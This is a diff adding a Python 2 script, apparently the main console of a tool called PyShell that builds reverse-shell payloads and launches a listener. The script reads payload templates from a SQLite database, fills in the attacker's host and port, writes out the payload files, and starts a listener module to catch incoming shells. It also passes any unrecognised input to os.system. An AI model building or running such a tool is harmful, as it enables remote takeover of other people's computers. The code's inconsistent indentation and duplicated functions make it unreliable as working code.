@@ -1,0 +1,170 @@
+#!/usr/bin/env python2
+import os, sys, subprocess,random,sqlite3
+from time import sleep
+class colors:
+        def __init__(self):
+                self.green = "\033[92m"
+                self.blue = "\033[94m"
+                self.bold = "\033[1m"
+                self.yellow = "\033[93m"
+                self.red = "\033[91m"
+                self.end = "\033[0m"
+co = colors()
+def slowprint1(s):
+    for c in s + '\n' :
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        sleep(10. / 200)
+def slowprint2(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        sleep(10. / 1000)
+def slowprint3(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        sleep(10. / 350)
+db=sqlite3.connect('pyshell.db')
+cur = db.execute('select code from payload')
+a = cur.fetchall()
+payload = [dict(d=row[0]) for row in a]
+reload(sys)
+sys.setdefaultencoding("utf-8")
+END='\033[0m'
+host   = " "
+port   = " "
+taf    = '\033[5;49m'
+code   = "False"
+name   = " "
+def re():
+        python = sys.executable
+        os.execl(python, python, * sys.argv)
+        curdir = os.getcwd()
+def slowprint1(s):
+    for c in s + '\n' :
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        sleep(10. / 200)
+sleep(2)
+os.system('clear')
+def logo():
+ l=random.randint(1,6)
+ if l==1:
+ 	sleep(2)
+ 	os.system('figlet -f slant PyShell')
+ elif l==2:
+	sleep(2)
+	os.system('figlet -f banner PyShell')
+ elif l==3:
+	sleep(2)
+	os.system('figlet PyShell')
+ elif l == 4 :
+	sleep(2)
+	os.system('figlet -f standard PyShell')
+ elif l == 5 :
+	sleep(2)
+	os.system('figlet -f small PyShell')
+ elif l == 6 :
+	sleep(2)
+	os.system('figlet -f bubble PyShell')
+ else: # Never :)
+	pass
+ print("""
+\t %s[!] Beta [!] %s
+\t [*] Versions : 1.0.4
+\t [*] Coded By : Khaled Nassar\n\t [*] Thanks   : Isla Mukheef \n""") % (taf,END)
+
+def help():
+ slowprint2("""
+  Commands :
+       set host       : Change Your Host (Ex: set host IP)
+       set port       : Change Your Port (Ex: set port 4444)
+       set name       : Change Your Name Session and Payload
+       show options   : Show [Host,Port,Name,Target,BG]
+       make 	      : Make Your Payload 
+       run            : Start The Listener
+""")
+def main():
+    global port,host,name,payload
+
+    while True:
+        ask = raw_input('[*] User@Pyshell :~ ').lower()
+        if ask == "help":
+            help()
+        elif ask == 'banner':
+            os.system("clear")
+            logo()
+            main()
+        elif "exit" in ask:
+			sleep(0.5)
+			print("\nGood Bye :)\n")
+			sys.exit()
+        elif "set host" in ask:
+            host = ask.split()[-1]
+	    print("Host => {}").format(host)
+        elif "set port" in ask:
+		try:
+            		port = int(ask.split()[-1])
+			print("Port => {}").format(str(port))
+		except:
+			print(colored("[!] Error [!]","red"))
+			sleep(0.2)
+			main()
+	elif "set name" in ask:
+	    name = ask.split()[-1]
+	    print ("Name => {}").format(name)
+        elif ask == "show options":
+            info=("\n[+] Your Host : %s\n[+] Your Port : %s\n[+] Session Name : %s\n") % (host,port,name)
+	    slowprint2(info)
+	    main()
+        elif ask == "make":
+            if host != " " and port != " " and name != " ":
+                slowprint1("[+] bulding Payload [+]")
+                os.chdir('payloads')
+                for i in payload:
+                    with open(name,'w') as f:
+                        f.write(i['d'].replace('lolh',host).replace('lolp',str(port)))
+                os.chdir('..')
+                sleep(2)
+                slowprint2("[+] Completed [+]\n[!] Seved in payloads File")
+                main()
+     	    else:
+ 		print("""
+[!] Host   : %s
+[!] Port   : %s
+[!] Name   : %s
+""") % (host,port,name)
+        elif ask == "run":
+	    if host != " " and port != " ":
+                if os.name == "nt":
+                    subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port),name], creationflags=subprocess.CREATE_NEW_CONSOLE)
+                else:
+                    os.system(sys.executable + " modules/listener.py %s %s %s" % (host,str(port),name))
+            else:
+                print ("\n[!] Host : %s\n[!] Port : %s\n[!] Name : %s\n") % (host,port,name)
+	elif ask == "exit":
+		sys.exit()
+        else:
+		os.system(ask)
+		main()
+
+def start():
+    try:
+        logo()
+        main()
+    except EOFError:
+                import sys,os,time
+                print("\n[!]  Detect to exit . . .")
+                time.sleep(1.3)
+                print("\n[!] Good Bye\n")
+                sys.exit()
+    except KeyboardInterrupt:
+        	import sys,os,time
+		print("\n[!]  Detect to exit . . .")
+		time.sleep(1.3)
+		print("\n[!] Good Bye\n")
+		sys.exit()
+if __name__ == "__main__":
+    start()
+
